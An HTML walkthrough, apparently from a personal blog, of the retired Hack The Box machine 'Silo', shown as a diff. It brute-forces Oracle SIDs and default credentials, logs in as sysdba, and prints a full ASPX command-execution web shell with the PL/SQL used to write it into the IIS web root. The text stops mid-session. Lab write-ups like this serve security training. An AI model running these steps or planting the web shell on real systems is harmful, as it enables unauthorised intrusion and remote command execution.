@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Silo</strong></h1>
+        <em>Released: 17th March 2018 / Pwned: September 4th 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Silo is all about attacking Oracle. Oracle is a relational database management system which is, often, reliably insecure. When logged into an Oracle database it can also, conventianly, be used to elevate your privileges to a shell or even SYSTEM privlieges. You first bruteforce the database for a SID and login credentials. With access to the database, you upload a reverse shell to the web server and gain access to the system. You're then lead by a note to a memory dump from which you extract Administrator's NTLM hash.<br>
+        <br>
+        There's also an easier method to gain a shell on the target if you make full use of the ODAT tool, as well as an extra privilege escalation route using RottenPotato.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.82</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/silo#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.82<br>
+                ..<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                80/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;IIS&nbsp;httpd&nbsp;8.5<br>
+                |&nbsp;http-methods:&nbsp;<br>
+                |_&nbsp;&nbsp;Potentially&nbsp;risky&nbsp;methods:&nbsp;TRACE<br>
+                |_http-server-header:&nbsp;Microsoft-IIS/8.5<br>
+                |_http-title:&nbsp;IIS&nbsp;Windows&nbsp;Server<br>
+                135/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                139/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;netbios-ssn&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;netbios-ssn<br>
+                445/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;microsoft-ds&nbsp;Microsoft&nbsp;Windows&nbsp;Server&nbsp;2008&nbsp;R2&nbsp;-&nbsp;2012&nbsp;microsoft-ds<br>
+                1521/tcp&nbsp;&nbsp;open&nbsp;&nbsp;oracle-tns&nbsp;&nbsp;&nbsp;Oracle&nbsp;TNS&nbsp;listener&nbsp;11.2.0.2.0&nbsp;(unauthorized)<br>
+                49152/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                49153/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                49154/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                49155/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                49158/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                49160/tcp&nbsp;open&nbsp;&nbsp;oracle-tns&nbsp;&nbsp;&nbsp;Oracle&nbsp;TNS&nbsp;listener&nbsp;(requires&nbsp;service&nbsp;name)<br>
+                49161/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(If&nbsp;you&nbsp;know&nbsp;what&nbsp;OS&nbsp;is&nbsp;running&nbsp;on&nbsp;it,&nbsp;see&nbsp;https://nmap.org/submit/&nbsp;).<br>
+                <br>
+                Network&nbsp;Distance:&nbsp;2&nbsp;hops<br>
+                Service&nbsp;Info:&nbsp;OSs:&nbsp;Windows,&nbsp;Windows&nbsp;Server&nbsp;2008&nbsp;R2&nbsp;-&nbsp;2012;&nbsp;CPE:&nbsp;cpe:/o:microsoft:windows<br>
+                <br>
+                Host&nbsp;script&nbsp;results:<br>
+                |&nbsp;smb-security-mode:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;account_used:&nbsp;guest<br>
+                |&nbsp;&nbsp;&nbsp;authentication_level:&nbsp;user<br>
+                |&nbsp;&nbsp;&nbsp;challenge_response:&nbsp;supported<br>
+                |_&nbsp;&nbsp;message_signing:&nbsp;supported<br>
+                |&nbsp;smb2-security-mode:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2.02:&nbsp;<br>
+                |_&nbsp;&nbsp;&nbsp;&nbsp;Message&nbsp;signing&nbsp;enabled&nbsp;but&nbsp;not&nbsp;required<br>
+                |&nbsp;smb2-time:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;date:&nbsp;2019-09-03&nbsp;10:24:01<br>
+                |_&nbsp;&nbsp;start_date:&nbsp;2019-09-03&nbsp;10:17:41
+            </div>
+        </div><br>
+        <br>
+        <strong>Ports</strong><br>
+        • 80/http - A web server, which is useful for later. You can gobuster and nikto the site, but there's nothing there.<br>
+        • 139/smb - A share, but we don't have any credentials so can't access it.<br>
+        • 1521/oracle - Oracle! This is a unique result, so this is our target<br>
+        <br>
+        There are typically 4 stages to attacking Oracle<br>
+        1. Enumerate for SIDs of the database<br>
+        2. Bruteforce for login credentials<br>
+        3. Authenticate/connect to the database using credentials + SID<br>
+        4. Priv-esc/exploit the database<br>
+        <br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) metasploit sid_brute</strong></h2><br>
+        The first step in attacking Oracle is bruteforcing for database SIDs. A SID is a Service Identifier.<br>
+        SID values uniquely identify databases within Oracle environments, and are used during database connection and authentication.<br>
+        <br>
+        Metasploit has a module - <code>sid_brute</code> - which can bruteforce the database for a SID.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo#&nbsp;msfconsole&nbsp;-q<br>
+                msf5&nbsp;&gt;&nbsp;use&nbsp;auxiliary/scanner/oracle/sid_brute&nbsp;<br>
+                msf5&nbsp;auxiliary(scanner/oracle/sid_brute)&nbsp;&gt;&nbsp;set&nbsp;RHOSTS&nbsp;10.10.10.82<br>
+                msf5&nbsp;auxiliary(scanner/oracle/sid_brute)&nbsp;&gt;&nbsp;set&nbsp;VERBOSE&nbsp;false<br>
+                msf5&nbsp;auxiliary(scanner/oracle/sid_brute)&nbsp;&gt;&nbsp;run<br>
+                <br>
+                [*]&nbsp;10.10.10.82:1521&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Checking&nbsp;571&nbsp;SIDs&nbsp;against&nbsp;10.10.10.82:1521<br>
+                [+]&nbsp;10.10.10.82:1521&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;10.10.10.82:1521&nbsp;Oracle&nbsp;-&nbsp;'XE'&nbsp;is&nbsp;valid<br>
+                [+]&nbsp;10.10.10.82:1521&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;10.10.10.82:1521&nbsp;Oracle&nbsp;-&nbsp;'PLSEXTPROC'&nbsp;is&nbsp;valid<br>
+                [+]&nbsp;10.10.10.82:1521&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;10.10.10.82:1521&nbsp;Oracle&nbsp;-&nbsp;'CLREXTPROC'&nbsp;is&nbsp;valid<br>
+                [*]&nbsp;10.10.10.82:1521&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Scanned&nbsp;1&nbsp;of&nbsp;1&nbsp;hosts&nbsp;(100%&nbsp;complete)<br>
+                [*]&nbsp;Auxiliary&nbsp;module&nbsp;execution&nbsp;completed
+            </div>
+        </div><br>
+        <br>
+        Metasploit found 3 valid SIDs:<br>
+        • XE<br>
+        • PLSEXTPROC<br>
+        • CLREXTPROC<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) odat passwordguesser</strong></h2><br>
+        The next step in attacking Oracle is to bruteforce for login credentials.<br>
+        There's an nmap script for this - <code>oracle-brute</code> - but it wouldn't work for me.<br>
+        <br>
+        Instead, there's a Oracle attack tool called <code>odat</code> which will successfully bruteforce for credentials - <a href="https://github.com/quentinhardy/odat/releases/">https://github.com/quentinhardy/odat/releases/</a><br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>3a) Install odat</strong></h3><br>
+        If you need to install odat, the easiest way is to download the standalone binary and unzip it - <a href="https://github.com/quentinhardy/odat/releases/">https://github.com/quentinhardy/odat/releases/</a><br>
+        I modified the directory name and binary name to make things easier.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo#&nbsp;wget&nbsp;https://github.com/quentinhardy/odat/releases/download/2.3/odat-linux-libc2.5-i686-v2.3.zip<br>
+                root@gotham:~/ctf/silo#&nbsp;unzip&nbsp;odat-linux-libc2.5-i686-v2.3.zip&nbsp;<br>
+                root@gotham:~/ctf/silo#&nbsp;mv&nbsp;odat-libc2.5-i686-v2.3&nbsp;odat-32bit-2.3<br>
+                root@gotham:~/ctf/silo#&nbsp;cd&nbsp;odat-32bit-2.3/<br>
+                root@gotham:~/ctf/silo/odat-libc2.5-i686-v2.3#&nbsp;mv&nbsp;odat-libc2.5-i686&nbsp;odat
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>3b) Modify credentials wordlist</strong></h3><br>
+        Oracle 9 and below's passwords weren't case sensitive.<br>
+        In Oracle 10 and higher, passwords became case sensitive.<br>
+        <br>
+        Thefore, odat's <code>accounts/accounts.txt</code> wordlist is invalid for use with the target's Oracle Database because it's Oracle 11.<br>
+        In that case, we can use metasploit's <code>oracle_default_userpass.txt</code> wordlist - <code>/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt</code><br>
+        <br>
+        When using odat, the format of the credentials wordlist must be <code>username/password</code>.<br>
+        Because we're using <code>/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt</code>, we have to modify the format to replace the spaces with <code>/</code>.<br>
+        <br>
+        You can do this using <code>vim oracle_default_userpass.txt</code> and <code>:%s/ /\//g</code>.<br>
+        Copy the metasploit wordlist to odat's <code>accounts/</code> directory and modify the wordlist.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo/odat-32bit-2.3#&nbsp;cp&nbsp;/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt&nbsp;accounts/<br>
+                root@gotham:~/ctf/silo/odat-32bit-2.3#&nbsp;ls&nbsp;accounts/<br>
+                accounts_multiple.txt&nbsp;&nbsp;accounts.txt&nbsp;&nbsp;oracle_default_userpass.txt<br>
+                accounts_small.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;logins.txt&nbsp;&nbsp;&nbsp;&nbsp;pwds.txt<br>
+                root@gotham:~/ctf/silo/odat-32bit-2.3#&nbsp;vim&nbsp;accounts/oracle_default_userpass.txt<br>
+                ...<br>
+                ctxdemo&nbsp;ctxdemo<br>
+                ctxsys&nbsp;change_on_install<br>
+                :%s/&nbsp;/\//g<br>
+                root@gotham:~/ctf/silo/odat-32bit-2.3#&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>3c) Bruteforce credentials</strong></h3><br>
+        With the credentials wordlist prepared, bruteforce for credenitals using odat's <code>passwordguesser</code> module.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo/odat-32bit-2.3#&nbsp;./odat&nbsp;passwordguesser&nbsp;-s&nbsp;10.10.10.82&nbsp;-p&nbsp;1521&nbsp;-d&nbsp;XE&nbsp;--accounts-file&nbsp;accounts/oracle_default_userpass.txt&nbsp;<br>
+                <br>
+                [1]&nbsp;(10.10.10.82:1521):&nbsp;Searching&nbsp;valid&nbsp;accounts&nbsp;on&nbsp;the&nbsp;10.10.10.82&nbsp;server,&nbsp;port&nbsp;1521<br>
+                [+]&nbsp;Valid&nbsp;credentials&nbsp;found:&nbsp;scott/tiger.&nbsp;Continue...<br>
+                100%&nbsp;|#########################################################################|&nbsp;Time:&nbsp;00:04:02&nbsp;<br>
+                [+]&nbsp;Accounts&nbsp;found&nbsp;on&nbsp;10.10.10.82:1521/XE:&nbsp;<br>
+                scott/tiger
+            </div>
+        </div><br>
+        <br>
+        Success!<br>
+        We've found a pair of valid credentials - <code>scott / tiger</code><br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) Access database &amp; Upload web shell</strong></h2><br>
+        You can log in to the oracle database from Kali using <code>sqlplus</code>.<br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>4a) Install sqlplus</strong></h3><br>
+        Download the following Oracle Instant Client packages for Linux from the link and save the files to an <code>/opt/oracle/</code> directory, e.g.<br>
+        • /opt/oracle/instantclient-basic-linux-12.1.0.2.0.zip<br>
+        • /opt/oracle/instantclient-sqlplus-linux-12.1.0.2.0.zip<br>
+        <br>
+        Download - <a href="https://www.oracle.com/database/technologies/instant-client/downloads.html">https://www.oracle.com/database/technologies/instant-client/downloads.html</a><br>
+        <br>
+        Then unzip the archives and apend the evironment variables to the end of your <code>.bashrc</code> file.<br>
+            <div class="codebox">
+                root@gotham:~/Downloads#&nbsp;mkdir&nbsp;/opt/oracle/<br>
+                root@gotham:~/Downloads#&nbsp;mv&nbsp;instantclient-basic-linux-19.3.0.0.0dbru.zip&nbsp;/opt/oracle/<br>
+                root@gotham:~/Downloads#&nbsp;mv&nbsp;instantclient-sqlplus-linux-19.3.0.0.0dbru.zip&nbsp;/opt/oracle<br>
+                root@gotham:~/Downloads#&nbsp;cd&nbsp;/opt/oracle/<br>
+                root@gotham:/opt/oracle#&nbsp;unzip&nbsp;instantclient-basic-linux-19.3.0.0.0dbru.zip&nbsp;<br>
+                root@gotham:/opt/oracle#&nbsp;unzip&nbsp;instantclient-sqlplus-linux-19.3.0.0.0dbru.zip&nbsp;<br>
+                root@gotham:/opt/oracle#&nbsp;ls<br>
+                instantclient_19_3<br>
+                instantclient-basic-linux-19.3.0.0.0dbru.zip<br>
+                instantclient-sqlplus-linux-19.3.0.0.0dbru.zip<br>
+                root@gotham:/opt/oracle#&nbsp;nano&nbsp;~/.bashrc<br>
+                ...<br>
+                #&nbsp;sqlplus&nbsp;oracle&nbsp;setup<br>
+                export&nbsp;PATH=$PATH:/opt/oracle/instantclient_19_3<br>
+                export&nbsp;SQLPATH=/opt/oracle/instantclient_19_3<br>
+                export&nbsp;TNS_ADMIN=/opt/oracle/instantclient_19_3<br>
+                export&nbsp;LD_LIBRARY_PATH=/opt/oracle/instantclient_19_3<br>
+                export&nbsp;ORACLE_HOME=/opt/oracle/instantclient_19_3
+            </div>
+        </div><br>
+        <br>
+        Upon logging-out and back in, the sqlplus utility should work.<br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>4b) Log in to Oracle using sqlplus</strong></h3><br>
+        With sqlplus installed, you should be able to log in using the credentials found earlier.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo#&nbsp;sqlplus&nbsp;scott/tiger@10.10.10.82/XE&nbsp;as&nbsp;sysdba<br>
+                <br>
+                SQL*Plus:&nbsp;Release&nbsp;19.0.0.0.0&nbsp;-&nbsp;Production&nbsp;on&nbsp;Wed&nbsp;Sep&nbsp;4&nbsp;17:29:27&nbsp;2019<br>
+                Version&nbsp;19.3.0.0.0<br>
+                <br>
+                Copyright&nbsp;(c)&nbsp;1982,&nbsp;2019,&nbsp;Oracle.&nbsp;&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                <br>
+                Connected&nbsp;to:<br>
+                Oracle&nbsp;Database&nbsp;11g&nbsp;Express&nbsp;Edition&nbsp;Release&nbsp;11.2.0.2.0&nbsp;-&nbsp;64bit&nbsp;Production<br>
+                <br>
+                SQL&gt;
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>4c) Upload web shell</strong></h3><br>
+        Within oracle, you can write files to the server.<br>
+        <br>
+        I wrote the <code>cmdasp.aspx</code> web shell in <code>/usr/share/webshells/aspx</code> to the root of the IIS web server in order to get a reverse shell.<br>
+        Oracle tends not to like writing more than 1024 characters to a file, so you should first trim the <code>cmdasp.aspx</code> file by removing the STYLE tags from <code>&lt;asp</code> enties and remove the HEAD tags.<br>
+        <br>
+        Here's my trimmed cmdasp.aspx script.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo#&nbsp;cp&nbsp;/usr/share/webshells/aspx/cmdasp.aspx&nbsp;.<br>
+                root@gotham:~/ctf/silo#&nbsp;nano&nbsp;cmdasp.aspx<br>
+                <span style="color:#333333;font-weight:400">&lt;%</span>@&nbsp;Page&nbsp;Language<span style="color:#ff9d00;font-weight:400">=</span><span style="color:#3ad900;font-weight:400">"C#"</span>&nbsp;Debug<span style="color:#ff9d00;font-weight:400">=</span><span style="color:#3ad900;font-weight:400">"true"</span>&nbsp;Trace<span style="color:#ff9d00;font-weight:400">=</span><span style="color:#3ad900;font-weight:400">"false"</span>&nbsp;<span style="color:#333333;font-weight:400">%&gt;</span><br>
+                <span style="color:#333333;font-weight:400">&lt;%</span>@&nbsp;Import&nbsp;Namespace<span style="color:#ff9d00;font-weight:400">=</span><span style="color:#3ad900;font-weight:400">"System.Diagnostics"</span>&nbsp;<span style="color:#333333;font-weight:400">%&gt;</span><br>
+                <span style="color:#333333;font-weight:400">&lt;%</span>@&nbsp;Import&nbsp;Namespace<span style="color:#ff9d00;font-weight:400">=</span><span style="color:#3ad900;font-weight:400">"System.IO"</span>&nbsp;<span style="color:#333333;font-weight:400">%&gt;</span><br>
+                <span style="color:#7f0044;font-weight:400">&lt;script</span>&nbsp;<span style="color:#333333;font-weight:400">Language="c#"</span>&nbsp;<span style="color:#333333;font-weight:400">runat="server"</span><span style="color:#7f0044;font-weight:400">&gt;</span><br>
+                <span style="color:#ff9d00;font-weight:700">void</span>&nbsp;Page_Load(object&nbsp;sender,&nbsp;EventArgs&nbsp;e)<br>
+                {<br>
+                }<br>
+                string&nbsp;ExcuteCmd(string&nbsp;arg)<br>
+                {<br>
+                ProcessStartInfo&nbsp;psi&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">new</span>&nbsp;ProcessStartInfo();<br>
+                psi.FileName&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"cmd.exe"</span>;<br>
+                psi.Arguments&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"/c&nbsp;"</span>+arg;<br>
+                psi.RedirectStandardOutput&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">true</span>;<br>
+                psi.UseShellExecute&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">false</span>;<br>
+                Process&nbsp;p&nbsp;=&nbsp;Process.Start(psi);<br>
+                StreamReader&nbsp;stmrdr&nbsp;=&nbsp;p.StandardOutput;<br>
+                string&nbsp;s&nbsp;=&nbsp;stmrdr.ReadToEnd();<br>
+                stmrdr.Close();<br>
+                <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;s;<br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">void</span>&nbsp;cmdExe_Click(object&nbsp;sender,&nbsp;System.EventArgs&nbsp;e)<br>
+                {<br>
+                Response.Write(<span style="color:#3ad900;font-weight:400">"&lt;pre&gt;"</span>);<br>
+                Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));<br>
+                Response.Write(<span style="color:#3ad900;font-weight:400">"&lt;/pre&gt;"</span>);<br>
+                }<br>
+                <span style="color:#7f0044;font-weight:400">&lt;/script&gt;</span><br>
+                <span style="color:#7f0044;font-weight:400">&lt;HTML&gt;</span><br>
+                <span style="color:#7f0044;font-weight:400">&lt;body&nbsp;&gt;</span><br>
+                <span style="color:#7f0044;font-weight:400">&lt;form</span>&nbsp;<span style="color:#333333;font-weight:400">id="cmd"</span>&nbsp;<span style="color:#333333;font-weight:400">method="post"</span>&nbsp;<span style="color:#333333;font-weight:400">runat="server"</span><span style="color:#7f0044;font-weight:400">&gt;</span><br>
+                <span style="color:#7f0044;font-weight:400">&lt;asp</span><span style="color:#333333;font-weight:400">:TextBox</span>&nbsp;<span style="color:#333333;font-weight:400">id="txtArg"</span>&nbsp;<span style="color:#333333;font-weight:400">runat="server"</span>&nbsp;<span style="color:#333333;font-weight:400">Width="250px"</span><span style="color:#7f0044;font-weight:400">&gt;&lt;/asp</span><span style="color:#333333;font-weight:400">:TextBox</span><span style="color:#7f0044;font-weight:400">&gt;</span><br>
+                <span style="color:#7f0044;font-weight:400">&lt;asp</span><span style="color:#333333;font-weight:400">:Button</span>&nbsp;<span style="color:#333333;font-weight:400">id="testing"</span>&nbsp;<span style="color:#333333;font-weight:400">runat="server"</span>&nbsp;<span style="color:#333333;font-weight:400">Text="excute"</span>&nbsp;<span style="color:#333333;font-weight:400">OnClick="cmdExe_Click"</span><span style="color:#7f0044;font-weight:400">&gt;&lt;/asp</span><span style="color:#333333;font-weight:400">:Button</span><span style="color:#7f0044;font-weight:400">&gt;</span><br>
+                <span style="color:#7f0044;font-weight:400">&lt;asp</span><span style="color:#333333;font-weight:400">:Label</span>&nbsp;<span style="color:#333333;font-weight:400">id="lblText"</span>&nbsp;<span style="color:#333333;font-weight:400">runat="server"</span><span style="color:#7f0044;font-weight:400">&gt;</span>Command:<span style="color:#7f0044;font-weight:400">&lt;/asp</span><span style="color:#333333;font-weight:400">:Label</span><span style="color:#7f0044;font-weight:400">&gt;</span><br>
+                <span style="color:#7f0044;font-weight:400">&lt;/form&gt;</span><br>
+                <span style="color:#7f0044;font-weight:400">&lt;/body&gt;</span><br>
+                <span style="color:#7f0044;font-weight:400">&lt;/HTML&gt;</span>
+            </div>
+        </div><br>
+        <br>
+        Then using <code>sed</code>, remove the newlines.<br>
+        The word count is now 990, which is fine.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo#&nbsp;sed&nbsp;-z&nbsp;'s/\n//g'&nbsp;cmdasp.aspx&nbsp;|&nbsp;wc&nbsp;-c<br>
+                990<br>
+                root@gotham:~/ctf/silo#&nbsp;sed&nbsp;-z&nbsp;'s/\n//g'&nbsp;cmdasp.aspx&nbsp;&gt;&nbsp;cmdasp.aspx.trim<br>
+                root@gotham:~/ctf/silo#&nbsp;cat&nbsp;cmdasp.aspx.trim&nbsp;<br>
+                &lt;%@&nbsp;Page&nbsp;Language="C#"&nbsp;Debug="true"&nbsp;Trace="false"&nbsp;%&gt;&lt;%@&nbsp;Import&nbsp;Namespace="System.Diagnostics"&nbsp;%&gt;&lt;%@&nbsp;Import&nbsp;Namespace="System.IO"&nbsp;%&gt;&lt;script&nbsp;Language="c#"&nbsp;runat="server"&gt;void&nbsp;Page_Load(object&nbsp;sender,&nbsp;EventArgs&nbsp;e){}string&nbsp;ExcuteCmd(string&nbsp;arg){ProcessStartInfo&nbsp;psi&nbsp;=&nbsp;new&nbsp;ProcessStartInfo();psi.FileName&nbsp;=&nbsp;"cmd.exe";psi.Arguments&nbsp;=&nbsp;"/c&nbsp;"+arg;psi.RedirectStandardOutput&nbsp;=&nbsp;true;psi.UseShellExecute&nbsp;=&nbsp;false;Process&nbsp;p&nbsp;=&nbsp;Process.Start(psi);StreamReader&nbsp;stmrdr&nbsp;=&nbsp;p.StandardOutput;string&nbsp;s&nbsp;=&nbsp;stmrdr.ReadToEnd();stmrdr.Close();return&nbsp;s;}void&nbsp;cmdExe_Click(object&nbsp;sender,&nbsp;System.EventArgs&nbsp;e){Response.Write("&lt;pre&gt;");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("&lt;/pre&gt;");}&lt;/script&gt;&lt;HTML&gt;&lt;body&nbsp;&gt;&lt;form&nbsp;id="cmd"&nbsp;method="post"&nbsp;runat="server"&gt;&lt;asp:TextBox&nbsp;id="txtArg"&nbsp;runat="server"&nbsp;Width="250px"&gt;&lt;/asp:TextBox&gt;&lt;asp:Button&nbsp;id="testing"&nbsp;runat="server"&nbsp;Text="excute"&nbsp;OnClick="cmdExe_Click"&gt;&lt;/asp:Button&gt;&lt;asp:Label&nbsp;id="lblText"&nbsp;runat="server"&gt;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;
+            </div>
+        </div><br>
+        <br>
+        On the sqlplus shell, set the server output to ON so that you can read the output of your script/command,<br>
+            <div class="codebox">
+                SQL&gt;&nbsp;set&nbsp;serveroutput&nbsp;ON
+            </div>
+        </div><br>
+        <br>
+        Copy and paste this script into your sqlplus shell.<br>
+            <div class="codebox">
+                declare<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;f&nbsp;utl_file.file_type;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;s&nbsp;varchar2(1030)&nbsp;:=&nbsp;'&lt;%@&nbsp;Page&nbsp;Language="C#"&nbsp;Debug="true"&nbsp;Trace="false"&nbsp;%&gt;&lt;%@&nbsp;Import&nbsp;Namespace="System.Diagnostics"&nbsp;%&gt;&lt;%@&nbsp;Import&nbsp;Namespace="System.IO"&nbsp;%&gt;&lt;script&nbsp;Language="c#"&nbsp;runat="server"&gt;void&nbsp;Page_Load(object&nbsp;sender,&nbsp;EventArgs&nbsp;e){}string&nbsp;ExcuteCmd(string&nbsp;arg){ProcessStartInfo&nbsp;psi&nbsp;=&nbsp;new&nbsp;ProcessStartInfo();psi.FileName&nbsp;=&nbsp;"cmd.exe";psi.Arguments&nbsp;=&nbsp;"/c&nbsp;"+arg;psi.RedirectStandardOutput&nbsp;=&nbsp;true;psi.UseShellExecute&nbsp;=&nbsp;false;Process&nbsp;p&nbsp;=&nbsp;Process.Start(psi);StreamReader&nbsp;stmrdr&nbsp;=&nbsp;p.StandardOutput;string&nbsp;s&nbsp;=&nbsp;stmrdr.ReadToEnd();stmrdr.Close();return&nbsp;s;}void&nbsp;cmdExe_Click(object&nbsp;sender,&nbsp;System.EventArgs&nbsp;e){Response.Write("&lt;pre&gt;");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("&lt;/pre&gt;");}&lt;/script&gt;&lt;HTML&gt;&lt;body&nbsp;&gt;&lt;form&nbsp;id="cmd"&nbsp;method="post"&nbsp;runat="server"&gt;&lt;asp:TextBox&nbsp;id="txtArg"&nbsp;runat="server"&nbsp;Width="250px"&gt;&lt;/asp:TextBox&gt;&lt;asp:Button&nbsp;id="testing"&nbsp;runat="server"&nbsp;Text="excute"&nbsp;OnClick="cmdExe_Click"&gt;&lt;/asp:Button&gt;&lt;asp:Label&nbsp;id="lblText"&nbsp;runat="server"&gt;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;';<br>
+                begin<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;f&nbsp;:=&nbsp;utl_file.fopen('/inetpub/wwwroot',&nbsp;'webshell.aspx',&nbsp;'W');<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;utl_file.put_line(f,s);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;utl_file.fclose(f);<br>
+                end;
+            </div>
+        </div><br>
+        <br>
+        This will write the .aspx shell to the root of the web server.<br>
+        Input <code>/</code> to complete the script and upload the file.<br>
+            <div class="codebox">
+                SQL&nbsp;&gt;&nbsp;/
+            </div>
+        </div><br>
+        <br>
+        Your sqlplus shell should look like this:<br>
+            <div class="codebox">
+                SQL&gt;&nbsp;declare<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;f&nbsp;utl_file.file_type;<br>
